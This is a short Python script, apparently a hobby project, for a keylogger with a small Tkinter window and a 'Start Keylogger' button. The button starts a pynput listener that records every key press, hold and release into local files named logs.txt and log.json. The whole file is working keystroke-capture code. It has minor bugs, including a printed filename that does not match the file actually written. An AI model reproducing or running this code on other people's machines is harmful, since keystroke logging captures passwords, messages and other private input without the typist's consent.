from pynput import keyboard
import json
import tkinter as tk
from tkinter import *

root = tk.Tk()
root.geometry("250x200")
root.title("Keylogger ")

key_list = []
x = False
key_storkes = ""

def update_txt_file(key):
    with open('logs.txt','w') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('log.json','+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append(
            {'Pressed':f'{key}'}
        )
        x = True
    if x == True:
        key_list.append(
            {'Held':f'{key}'}
        )
    
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_storkes
    key_list.append({
        'Released':f'{key}'
    })
    if x == True:
        x = False

    key_storkes = key_storkes+str(key)
    update_txt_file(str(key_storkes))


def butaction():
    print("[+] Running Keylogger successfully! \n [:] saving the key logs in 'logs.json' and 'logs.txt'")
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()

empty = Label(root, text="keylogger", font="verdana 11 bold").grid(row=2, column=2)
Button(root, text="Start Keylogger", command=butaction).grid(row=5,column=2)
root.mainloop()
